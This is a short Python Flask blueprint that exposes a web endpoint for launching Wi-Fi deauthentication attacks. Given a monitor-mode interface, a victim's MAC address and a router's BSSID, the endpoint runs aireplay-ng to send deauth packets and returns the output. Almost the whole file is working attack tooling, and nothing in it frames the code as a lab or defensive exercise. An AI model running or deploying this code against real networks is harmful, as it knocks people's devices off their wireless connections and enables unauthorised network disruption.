import subprocess
from flask import Blueprint, jsonify, request

deauth_attack = Blueprint("deauth_attack", __name__)

@deauth_attack.route("/deauth_attack", methods=["POST"])
def deauth():
    """Perform a Wi-Fi deauthentication attack using aireplay-ng"""
    data = request.json
    interface = data.get("interface")  # Network adapter in monitor mode
    target_mac = data.get("target_mac")  # MAC address of the victim device
    bssid = data.get("bssid")  # MAC address of the Wi-Fi router (AP)
    packets = data.get("packets", 10)  # Number of deauth packets to send

    if not interface or not target_mac or not bssid:
        return jsonify({"error": "Interface, target MAC, and BSSID are required"}), 400

    try:
        # Run aireplay-ng to send deauthentication packets
        deauth_cmd = [
            "aireplay-ng",
            "--deauth", str(packets),
            "-a", bssid,
            "-c", target_mac,
            interface
        ]
        result = subprocess.run(deauth_cmd, capture_output=True, text=True)

        return jsonify({"message": "Deauthentication attack sent", "output": result.stdout})

    except Exception as e:
        return jsonify({"error": str(e)}), 500
